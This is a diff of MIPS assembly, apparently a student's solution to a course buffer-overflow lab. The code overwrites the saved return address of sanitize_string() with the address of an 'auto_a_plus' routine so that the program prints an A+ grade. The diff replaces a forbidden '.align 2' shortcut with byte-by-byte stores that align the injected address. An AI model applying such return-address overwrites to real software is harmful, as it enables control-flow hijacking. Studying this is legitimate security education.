@@ -20,7 +20,6 @@ reduced_grade_string:  .asciiz "\nStudent grade: C-\n"
 
 new_grade_string: .asciiz "\nStudent grade: A+\n"
 
-.align 2 # TODO: Remove this as it is not an allowed manipulation
 .globl netid_buffer
  # this string contains the student NetID
 netid_buffer: .byte 0x6A 0x6F 0x68 0x6E 0x64 0x6F 0x65 0x0
@@ -164,11 +163,22 @@ attack_string:
 	
 walk:	# traipse into the word just after buffer_id (whose address is in $a0 and $t1 at this point) and inject $t0
 	lb $t2, 0($t1) 
-	beq $t2, $0, inject
+	beq $t2, $0, tmpInject
 	addiu $t1, $t1, 1
 	j walk
-inject:
-	addiu $t1, $t1, 1 # only for this cheaty way (using .align 2 in .data section); this add 1 aligns us on a word for the store in the next line
+tmpInject:
 	sw $t0, 0($t1)
+align: 
+	lb $t2, 0($t1) # t2 = first byte of auto_a_plus address
+	lb $t3, 1($t1) # t3 = second byte of auto_a_plus address
+	lb $t4, 2($t1) # t4 = third byte of auto_a_plus address
+	lb $t5, 3($t1) # t5 = fourth byte of auto_a_plus address
+ 	sb $0, 0($t1)  # store a null character, giving us | h o j \0 | e o d n | \0 \0 \0 "\0" | where the quoted \0 is what was injected
+ 		       # this is done so as to align the injected address of auto_a_plus on a word when we clobber sanitize_string()'s ra in the stack
+inject: # re-inject the address of auto_a_plus
+ 	sb $t2, 1($t1) # store the first byte of auto_a_plus address
+	sb $t3, 2($t1) # store the second byte of auto_a_plus address
+	sb $t4, 3($t1) # store the third byte of auto_a_plus address
+	sb $t5, 4($t1) # store the fourth byte of auto_a_plus address
 leave:
         jr $ra
